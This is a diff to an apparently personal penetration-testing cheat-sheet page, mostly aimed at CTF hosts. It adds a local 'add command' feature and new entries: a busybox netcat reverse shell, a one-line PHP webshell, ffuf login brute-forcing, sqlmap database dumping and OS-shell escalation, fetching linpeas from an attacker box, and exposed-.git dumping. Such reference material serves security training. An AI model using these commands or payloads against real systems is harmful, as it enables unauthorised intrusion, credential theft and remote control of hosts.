@@ -136,6 +136,46 @@ permalink: /cmd
   footer{border-top:1px solid var(--line);margin-top:70px;padding-top:22px;color:var(--dim);font-size:11px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
   .hidden{display:none !important;}
   .no-results{color:var(--dim);font-size:13px;padding:30px 0;text-align:center;display:none;}
+
+  /* ===== add-command controls ===== */
+  .addbar{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;}
+  .addbtn{
+    font-family:'JetBrains Mono',monospace;font-size:11.5px;letter-spacing:.3px;
+    padding:9px 14px;border-radius:7px;cursor:pointer;text-transform:uppercase;
+  }
+  .addbtn.primary{background:var(--c-exploit);border:none;color:#0a0d12;font-weight:700;}
+  .addbtn.ghost{background:var(--panel);border:1px solid var(--line);color:var(--muted);}
+  .addbtn.ghost:hover{color:var(--text);border-color:var(--dim);}
+
+  .modal-backdrop{
+    position:fixed;inset:0;background:rgba(6,8,12,.72);backdrop-filter:blur(2px);
+    display:none;align-items:center;justify-content:center;z-index:50;padding:20px;
+  }
+  .modal-backdrop.open{display:flex;}
+  .modal{
+    background:var(--panel);border:1px solid var(--line);border-radius:12px;
+    width:100%;max-width:480px;padding:22px;
+  }
+  .modal h4{margin:0 0 4px;font-size:16px;}
+  .modal .modal-sub{color:var(--muted);font-size:11.5px;margin:0 0 18px;}
+  .field{margin-bottom:12px;}
+  .field label{display:block;color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;}
+  .field input, .field select, .field textarea{
+    width:100%;background:var(--panel-2);border:1px solid var(--line);color:var(--text);
+    font-family:'JetBrains Mono',monospace;font-size:12.5px;padding:9px 10px;border-radius:6px;outline:none;
+  }
+  .field input:focus, .field select:focus, .field textarea:focus{border-color:var(--c-exploit);}
+  .field textarea{resize:vertical;min-height:44px;}
+  .modal-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:18px;}
+
+  .yours-badge{
+    font-size:9.5px;letter-spacing:.5px;text-transform:uppercase;color:var(--c-exploit);
+    border:1px solid var(--c-exploit);border-radius:4px;padding:1px 6px;flex:none;
+  }
+  .delbtn{
+    flex:none;background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:14px;line-height:1;padding:2px 4px;
+  }
+  .delbtn:hover{color:var(--c-exploit);}
 </style>
 </head>
 <body>
@@ -157,6 +197,11 @@ permalink: /cmd
         <span class="cursor"></span>
         <span class="stat" id="stat"></span>
       </div>
+      <div class="addbar">
+        <button class="addbtn primary" id="openAddBtn" type="button">+ add command</button>
+        <button class="addbtn ghost" id="exportBtn" type="button">export my additions</button>
+        <button class="addbtn ghost" id="clearBtn" type="button">clear my additions</button>
+      </div>
     </div>
 
     <div id="content"></div>
@@ -167,6 +212,41 @@ permalink: /cmd
       <span id="totalcount"></span>
     </footer>
   </main>
+</div>
+
+<div class="modal-backdrop" id="modalBackdrop">
+  <div class="modal">
+    <h4>Add a command</h4>
+    <p class="modal-sub">Saved in this browser (localStorage). Use "export my additions" to get a JSON file you can merge into the page's DATA array permanently.</p>
+    <form id="addForm">
+      <div class="field">
+        <label for="f-category">Category</label>
+        <select id="f-category">
+          <option value="__new__">+ New category…</option>
+        </select>
+      </div>
+      <div class="field" id="newCatField">
+        <label for="f-newcat">New category name</label>
+        <input id="f-newcat" type="text" placeholder="e.g. Kerberos Attacks">
+      </div>
+      <div class="field">
+        <label for="f-cmd">Command</label>
+        <input id="f-cmd" type="text" placeholder="e.g. nmap -sV -p- <ip>" required>
+      </div>
+      <div class="field">
+        <label for="f-desc">Description</label>
+        <input id="f-desc" type="text" placeholder="one line — what it does" required>
+      </div>
+      <div class="field">
+        <label for="f-example">Example (optional)</label>
+        <textarea id="f-example" placeholder="a worked example with real-ish values"></textarea>
+      </div>
+      <div class="modal-actions">
+        <button type="button" class="addbtn ghost" id="cancelAddBtn">cancel</button>
+        <button type="submit" class="addbtn primary">save command</button>
+      </div>
+    </form>
+  </div>
 </div>
 
 <script>
@@ -251,6 +331,8 @@ const DATA = [
     ["sqlmap -u \"<url>\" --os-shell","SQL injection to OS shell"],
     ["nc -lvnp <port>","Netcat listener"],
     ["nc <ip> <port>","Netcat connect"],
+    ["busybox nc -e /bin/sh <ip> <port>","Reverse shell via busybox nc when standard nc lacks -e"],
+    ["&lt;?php system($_GET[\"cmd\"]); ?&gt;","Minimal PHP webshell — drop on a target with file upload/write access, then call ?cmd=id"],
     ["openssl s_client -connect <ip>:<port>","SSL connection test"]
   ]},
 
@@ -265,6 +347,7 @@ const DATA = [
     ["cat /etc/passwd","List system users"],
     ["ps aux","Running processes"],
     ["find / -perm 2000 -o -perm 4000 2&gt;/dev/null","SUID/SGID find variant"],
+    ["find / -perm -u=s -type f 2&gt;/dev/null","Find SUID binaries (symbolic permission syntax)"],
     ["cat /etc/crontab","Cron jobs"],
     ["env","Environment variables"],
     ["history","Command history"]
@@ -478,7 +561,9 @@ const DATA = [
     ["ffuf -u \"http://<target>/?FUZZ=test\" -w params.txt","Parameter name discovery","ffuf -u \"http://target.htb/page?FUZZ=test\" -w param-names.txt"],
     ["ffuf -u http://<target>/login -w pass.txt -X POST -d \"user=admin&pass=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\"","Fuzz a POST body field (e.g. login form password)","ffuf -u http://target.htb/login -w rockyou.txt -X POST -d \"user=admin&pass=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -fc 401"],
     ["ffuf -u http://<target>/FUZZ -w wordlist.txt -recursion -recursion-depth 2","Recurse into discovered directories automatically","ffuf -u http://target.htb/FUZZ -w common.txt -recursion -recursion-depth 2"],
-    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -t 100 -rate 200","Tune concurrency and request rate","ffuf -u http://target.htb/FUZZ -w common.txt -t 100 -rate 200"]
+    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -t 100 -rate 200","Tune concurrency and request rate","ffuf -u http://target.htb/FUZZ -w common.txt -t 100 -rate 200"],
+    ["ffuf -u '&lt;url&gt;' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&amp;password=test' -w usernames.txt -mc all -ic -fs &lt;size&gt; -t 100","Fuzz the username field of a login form, filtering out the known 'wrong creds' response size","ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&amp;password=test' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100"],
+    ["ffuf -u '&lt;url&gt;' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=&lt;found_user&gt;&amp;password=FUZZ' -w passwords.txt -mc all -ic -fs &lt;size&gt; -t 100","Once a valid username is confirmed, fuzz the password field against it","ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&amp;password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100"]
   ]},
 
 { id:"tool-hydra", title:"Hydra — Deep Dive", color:"--c-tool", tool:true, desc:"Parallelized network login cracker supporting dozens of protocols.",
@@ -532,6 +617,9 @@ const DATA = [
     ["sqlmap -u \"http://<target>/page?id=1\" -D &lt;db&gt; -T users --dump","Dump the contents of a specific table","sqlmap -u \"http://target.htb/item.php?id=1\" -D shop -T users --dump"],
     ["sqlmap -u \"http://<target>/login\" --data=\"user=a&amp;pass=b\"","Test POST body parameters for injection","sqlmap -u \"http://target.htb/login\" --data=\"user=admin&amp;pass=test\""],
     ["sqlmap -r request.txt","Test injection using a raw request file saved from Burp","sqlmap -r login-request.txt --batch"],
+    ["sqlmap -r filename.txt --dbs --batch --level=5","Enumerate databases from a saved request file, auto-confirm prompts, max test depth","sqlmap -r filename.txt --dbs --batch --level=5"],
+    ["sqlmap -r filename.txt -D &lt;database_name&gt; --tables --level=5","List tables in a chosen database from a saved request file","sqlmap -r filename.txt -D shop --tables --level=5"],
+    ["sqlmap -r filename.txt -D &lt;database_name&gt; -T &lt;table_name&gt; --columns","List columns in a chosen table from a saved request file","sqlmap -r filename.txt -D shop -T users --columns"],
     ["sqlmap -u \"http://<target>/page?id=1\" --os-shell","Attempt to escalate injection to a full OS shell","sqlmap -u \"http://target.htb/item.php?id=1\" --os-shell"],
     ["sqlmap -u \"http://<target>/page?id=1\" --risk 3 --level 5","Increase test payload thoroughness (slower, more invasive)","sqlmap -u \"http://target.htb/item.php?id=1\" --risk 3 --level 5"],
     ["sqlmap -u \"http://<target>/page?id=1\" --tamper=space2comment","Apply a tamper script to help bypass basic WAF filtering","sqlmap -u \"http://target.htb/item.php?id=1\" --tamper=space2comment"]
@@ -545,6 +633,60 @@ const DATA = [
     ["{\"$ne\": null} in a login field","Manual NoSQL auth-bypass payload — matches any non-null value","POST /login  {\"username\":\"admin\",\"password\":{\"$ne\":null}}"],
     ["admin' || 'a'=='a","Manual NoSQL injection string for form fields that get concatenated into a query","Try in a username or search field on a suspected MongoDB backend"],
     ["mongo --host &lt;ip&gt; --port 27017","Connect directly to an exposed MongoDB instance for manual inspection","mongo --host 10.10.11.23 --port 27017 --eval \"db.adminCommand('listDatabases')\""]
+  ]},
+
+{ id:"shells", title:"Shells &amp; Stabilization", color:"--c-exploit", desc:"Getting a working shell and upgrading it into something usable, plus moving tooling onto the target.",
+  cmds:[
+    ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'","Upgrade a raw reverse/bind shell into a proper TTY","python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+    ["export TERM=xterm","Set TERM so tools like clear, nano, vim behave after upgrading the shell","export TERM=xterm"],
+    ["Ctrl+Z, then: stty raw -echo; fg","Background the shell, fix local terminal echo/raw mode, then foreground it again for full interactivity (arrow keys, tab-complete, Ctrl+C)","Ctrl+Z → stty raw -echo; fg → press Enter twice"],
+    ["python3 -m http.server","Quickly serve the current directory over HTTP to pull tools onto a target","python3 -m http.server 8000  (on attacker box, then wget http://&lt;attacker_ip&gt;:8000/linpeas.sh on target)"],
+    ["wget http://&lt;attacker_ip&gt;:8000/linpeas.sh -O /tmp/linpeas.sh","Download linpeas from your machine to the target's /tmp folder","wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh"],
+    ["chmod +x /tmp/linpeas.sh","Make the uploaded script executable","chmod +x /tmp/linpeas.sh"],
+    ["/tmp/linpeas.sh","Run linpeas to automatically enumerate privilege escalation paths","/tmp/linpeas.sh | tee /tmp/linpeas-out.txt"]
+  ]},
+
+{ id:"curl", title:"cURL — REST &amp; API Testing", color:"--c-web", desc:"Sending and manipulating HTTP/REST requests by hand — essential for API testing and confirming what a browser or Burp is really doing.",
+  cmds:[
+    ["curl -X GET <url>","Send a GET request explicitly","curl -X GET https://target.htb/api/users"],
+    ["curl -X POST <url> -d 'key=value'","Send a POST request with form-encoded body data","curl -X POST https://target.htb/api/login -d 'user=admin&pass=test'"],
+    ["curl -X POST <url> -H \"Content-Type: application/json\" -d '{\"key\":\"value\"}'","Send a POST request with a raw JSON body","curl -X POST https://target.htb/api/users -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"role\":\"user\"}'"],
+    ["curl -X PUT <url> -d '{...}'","Send a PUT request to update/replace a resource","curl -X PUT https://target.htb/api/users/1 -H \"Content-Type: application/json\" -d '{\"role\":\"admin\"}'"],
+    ["curl -X DELETE <url>","Send a DELETE request against a resource","curl -X DELETE https://target.htb/api/users/1"],
+    ["curl -i <url>","Show response headers along with the body","curl -i https://target.htb/api/status"],
+    ["curl -s -o out.json <url>","Silent mode, save response body to a file","curl -s -o resp.json https://target.htb/api/data"],
+    ["curl -u user:pass <url>","Authenticate using HTTP Basic Auth","curl -u admin:password123 https://target.htb/admin"],
+    ["curl -H \"Authorization: Bearer <token>\" <url>","Send a request with a bearer/JWT token, e.g. to test authz on protected endpoints","curl -H \"Authorization: Bearer eyJhbGciOi...\" https://target.htb/api/profile"],
+    ["curl --cookie \"name=value\" <url>","Send a request with a specific cookie, useful for session/IDOR testing","curl --cookie \"session=abc123\" https://target.htb/dashboard"],
+    ["curl -k <url>","Skip TLS certificate verification (self-signed certs on internal boxes)","curl -k https://10.10.11.23/api/health"],
+    ["curl -v <url>","Verbose mode — see the full request/response including TLS handshake","curl -v https://target.htb"]
+  ]},
+
+{ id:"systemctl", title:"systemctl — Services", color:"--c-sys", desc:"Inspecting what's actually running on a host you've landed on — often reveals internal-only services worth pivoting to.",
+  cmds:[
+    ["systemctl list-units --type=service --state=active","List all currently active services"],
+    ["systemctl list-units --type=service --state=running","List all currently running services"],
+    ["systemctl status <service>","Show detailed status, recent logs, and PID for a specific service"],
+    ["systemctl list-unit-files --type=service","List every installed service unit and its enabled/disabled state"],
+    ["systemctl is-active <service>","Quick check whether a specific service is active"],
+    ["systemctl is-enabled <service>","Check whether a service starts automatically on boot"],
+    ["systemctl show <service>","Dump full low-level properties of a service unit — env vars, exec paths, user it runs as"],
+    ["journalctl -u <service>","View logs for a specific systemd service"]
+  ]},
+
+{ id:"git", title:"Git — Pentester's View", color:"--c-post", desc:"Git commands for digging through exposed repos, commit history, and stashed changes — a common source of leaked credentials.",
+  cmds:[
+    ["git clone <repo_url>","Clone a discovered repository for offline inspection","git clone https://github.com/target-org/internal-app.git"],
+    ["git log --all","View the full commit history across all branches, not just the current one — often reveals commits removed from the default branch","git log --all --oneline"],
+    ["git log -p","Show the full diff for every commit — scan for hardcoded secrets/keys that were later 'removed'","git log -p -- config.php"],
+    ["git checkout <commit_id>","Check out the repo exactly as it was at a specific commit, to inspect files that were later deleted","git checkout 3f1a9c2"],
+    ["git show <commit_id>","Show exactly what changed in one specific commit","git show 3f1a9c2"],
+    ["git diff <commit1> <commit2>","Diff two commits to spot what was added/removed between them","git diff 3f1a9c2 9b7e0d1"],
+    ["git branch -a","List all branches, including remote-tracking ones that may not be checked out locally","git branch -a"],
+    ["git stash list","Check for stashed (uncommitted) changes left in the repo","git stash list"],
+    ["git stash show -p stash@{0}","View the actual contents of a stash — sometimes contains leftover secrets or debug code","git stash show -p stash@{0}"],
+    ["wget -r -np http://<target>/.git/","Pull down an exposed .git directory from a misconfigured web server","wget -r -np http://target.htb/.git/"],
+    ["git-dumper http://<target>/.git/ ./dump","Reconstruct a full working repo from an exposed .git directory (tool: git-dumper)","git-dumper http://target.htb/.git/ ./loot"]
   ]}
 ];
 
@@ -552,67 +694,105 @@ const DATA = [
 
 const navlist = document.getElementById('navlist');
 const content = document.getElementById('content');
-
-DATA.forEach(g => {
-  // nav link
-  const a = document.createElement('a');
-  a.href = '#' + g.id;
-  a.className = 'navlink';
-  a.innerHTML = `<span class="sw" style="background:var(${g.color})"></span>${g.title}`;
-  navlist.appendChild(a);
-
-  // section
-  const sec = document.createElement('section');
-  sec.className = 'group';
-  sec.id = g.id;
-  sec.style.setProperty('--gc', `var(${g.color})`);
-  sec.dataset.title = g.title.toLowerCase();
-
-  sec.innerHTML = `
-    <div class="group-head"><h3>${g.title}</h3></div>
-    <p class="group-desc">${g.desc}</p>
-    <div class="group-rule"></div>
-    <div class="grid"></div>
-  `;
-  const grid = sec.querySelector('.grid');
-
-  g.cmds.forEach(c => {
-    const [cmd, desc, example] = c;
-    const card = document.createElement('div');
-    card.className = 'card';
-    card.dataset.search = (cmd + ' ' + desc + ' ' + (example||'')).toLowerCase();
-    card.innerHTML = `
-      <div class="cmdrow">
-        <code>${cmd}</code>
-        <button class="copybtn" type="button">copy</button>
-      </div>
-      <div class="desc">${desc}</div>
-      ${example ? `<div class="example">${example}</div>` : ''}
-    `;
-    const btn = card.querySelector('.copybtn');
-    btn.addEventListener('click', () => {
-      const raw = cmd.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
-      navigator.clipboard.writeText(raw).then(() => {
-        btn.textContent = 'copied';
-        btn.classList.add('copied');
-        setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');}, 1200);
-      });
-    });
-    grid.appendChild(card);
-  });
-
-  content.appendChild(sec);
-});
-
-document.getElementById('totalcount').textContent =
-  DATA.reduce((n,g)=>n+g.cmds.length,0) + ' commands across ' + DATA.length + ' sections';
-
-/* ===== search / filter ===== */
 const search = document.getElementById('search');
 const noresults = document.getElementById('noresults');
 const stat = document.getElementById('stat');
+const CUSTOM_KEY = 'pentestref_custom_v1';
 
-search.addEventListener('input', () => {
+/* ===== custom-command storage (localStorage, this browser only) ===== */
+function getCustom(){
+  try { return JSON.parse(localStorage.getItem(CUSTOM_KEY) || '[]'); }
+  catch(e){ return []; }
+}
+function setCustom(arr){ localStorage.setItem(CUSTOM_KEY, JSON.stringify(arr)); }
+function slugify(s){ return 'custom-' + s.toLowerCase().trim().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,''); }
+
+/* merge base DATA with any locally-added custom commands */
+function buildGroups(){
+  const groups = DATA.map(g => ({ ...g, cmds: g.cmds.map(c => c.slice()) }));
+  getCustom().forEach(item => {
+    let g = groups.find(x => x.id === item.groupId);
+    if (!g) {
+      g = { id:item.groupId, title:item.groupTitle, color:'--c-misc', desc:'Commands you\'ve added while learning/practicing.', cmds:[] };
+      groups.push(g);
+    }
+    g.cmds.push([item.cmd, item.desc, item.example || '', true, item.uid]);
+  });
+  return groups;
+}
+
+/* ===== render ===== */
+function renderAll(){
+  const groups = buildGroups();
+  navlist.innerHTML = '';
+  content.innerHTML = '';
+
+  groups.forEach(g => {
+    const a = document.createElement('a');
+    a.href = '#' + g.id;
+    a.className = 'navlink';
+    a.innerHTML = `<span class="sw" style="background:var(${g.color})"></span>${g.title}`;
+    navlist.appendChild(a);
+
+    const sec = document.createElement('section');
+    sec.className = 'group';
+    sec.id = g.id;
+    sec.style.setProperty('--gc', `var(${g.color})`);
+    sec.dataset.title = g.title.toLowerCase();
+    sec.innerHTML = `
+      <div class="group-head"><h3>${g.title}</h3></div>
+      <p class="group-desc">${g.desc}</p>
+      <div class="group-rule"></div>
+      <div class="grid"></div>
+    `;
+    const grid = sec.querySelector('.grid');
+
+    g.cmds.forEach(c => {
+      const [cmd, desc, example, isCustom, uid] = c;
+      const card = document.createElement('div');
+      card.className = 'card';
+      card.dataset.search = (cmd + ' ' + desc + ' ' + (example||'')).toLowerCase();
+      card.innerHTML = `
+        <div class="cmdrow">
+          <code>${cmd}</code>
+          ${isCustom ? '<span class="yours-badge">yours</span>' : ''}
+          <button class="copybtn" type="button">copy</button>
+          ${isCustom ? '<button class="delbtn" type="button" title="remove">✕</button>' : ''}
+        </div>
+        <div class="desc">${desc}</div>
+        ${example ? `<div class="example">${example}</div>` : ''}
+      `;
+      card.querySelector('.copybtn').addEventListener('click', (e) => {
+        const btn = e.currentTarget;
+        const raw = cmd.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
+        navigator.clipboard.writeText(raw).then(() => {
+          btn.textContent = 'copied';
+          btn.classList.add('copied');
+          setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');}, 1200);
+        });
+      });
+      if (isCustom) {
+        card.querySelector('.delbtn').addEventListener('click', () => {
+          setCustom(getCustom().filter(x => x.uid !== uid));
+          renderAll();
+        });
+      }
+      grid.appendChild(card);
+    });
+
+    content.appendChild(sec);
+  });
+
+  document.getElementById('totalcount').textContent =
+    groups.reduce((n,g)=>n+g.cmds.length,0) + ' commands across ' + groups.length + ' sections';
+
+  applySearchFilter();
+  setupScrollHighlight();
+  populateCategorySelect(groups);
+}
+
+/* ===== search / filter ===== */
+function applySearchFilter(){
   const q = search.value.trim().toLowerCase();
   let visibleTotal = 0;
   document.querySelectorAll('section.group').forEach(sec => {
@@ -627,21 +807,95 @@ search.addEventListener('input', () => {
   });
   noresults.style.display = visibleTotal === 0 ? 'block' : 'none';
   stat.textContent = q ? visibleTotal + ' matches' : '';
-});
+}
+search.addEventListener('input', applySearchFilter);
 
 /* ===== active nav highlight on scroll ===== */
-const navlinks = [...document.querySelectorAll('.navlink')];
-const sections = [...document.querySelectorAll('section.group')];
-const io = new IntersectionObserver((entries) => {
-  entries.forEach(e => {
-    if (e.isIntersecting) {
-      navlinks.forEach(l => l.classList.remove('active'));
-      const link = navlinks.find(l => l.getAttribute('href') === '#' + e.target.id);
-      if (link) link.classList.add('active');
-    }
-  });
-}, { rootMargin: '-10% 0px -80% 0px' });
-sections.forEach(s => io.observe(s));
+function setupScrollHighlight(){
+  const navlinks = [...document.querySelectorAll('.navlink')];
+  const sections = [...document.querySelectorAll('section.group')];
+  const io = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        navlinks.forEach(l => l.classList.remove('active'));
+        const link = navlinks.find(l => l.getAttribute('href') === '#' + e.target.id);
+        if (link) link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -80% 0px' });
+  sections.forEach(s => io.observe(s));
+}
+
+/* ===== add-command modal ===== */
+const modalBackdrop = document.getElementById('modalBackdrop');
+const openAddBtn = document.getElementById('openAddBtn');
+const cancelAddBtn = document.getElementById('cancelAddBtn');
+const addForm = document.getElementById('addForm');
+const catSelect = document.getElementById('f-category');
+const newCatField = document.getElementById('newCatField');
+
+function populateCategorySelect(groups){
+  const current = catSelect.value;
+  catSelect.innerHTML = '<option value="__new__">+ New category…</option>' +
+    groups.map(g => `<option value="${g.id}">${g.title}</option>`).join('');
+  if ([...catSelect.options].some(o => o.value === current)) catSelect.value = current;
+  toggleNewCatField();
+}
+function toggleNewCatField(){
+  newCatField.style.display = catSelect.value === '__new__' ? 'block' : 'none';
+}
+catSelect.addEventListener('change', toggleNewCatField);
+
+openAddBtn.addEventListener('click', () => { modalBackdrop.classList.add('open'); document.getElementById('f-cmd').focus(); });
+cancelAddBtn.addEventListener('click', () => modalBackdrop.classList.remove('open'));
+modalBackdrop.addEventListener('click', (e) => { if (e.target === modalBackdrop) modalBackdrop.classList.remove('open'); });
+
+addForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  const cmd = document.getElementById('f-cmd').value.trim();
+  const desc = document.getElementById('f-desc').value.trim();
+  const example = document.getElementById('f-example').value.trim();
+  if (!cmd || !desc) return;
+
+  let groupId, groupTitle;
+  if (catSelect.value === '__new__') {
+    groupTitle = document.getElementById('f-newcat').value.trim() || 'My Notes';
+    groupId = slugify(groupTitle);
+  } else {
+    groupId = catSelect.value;
+    groupTitle = catSelect.options[catSelect.selectedIndex].textContent;
+  }
+
+  const custom = getCustom();
+  custom.push({ uid: Date.now() + '-' + Math.random().toString(36).slice(2,7), groupId, groupTitle, cmd, desc, example });
+  setCustom(custom);
+
+  addForm.reset();
+  toggleNewCatField();
+  modalBackdrop.classList.remove('open');
+  renderAll();
+  location.hash = '#' + groupId;
+});
+
+/* ===== export / clear ===== */
+document.getElementById('exportBtn').addEventListener('click', () => {
+  const custom = getCustom();
+  if (!custom.length) { alert('No custom commands saved yet in this browser.'); return; }
+  const blob = new Blob([JSON.stringify(custom, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'my-commands.json';
+  a.click();
+});
+document.getElementById('clearBtn').addEventListener('click', () => {
+  if (!getCustom().length) return;
+  if (confirm('Remove all commands you\'ve added in this browser? This cannot be undone (export first if unsure).')) {
+    setCustom([]);
+    renderAll();
+  }
+});
+
+renderAll();
 </script>
 </body>
 </html>
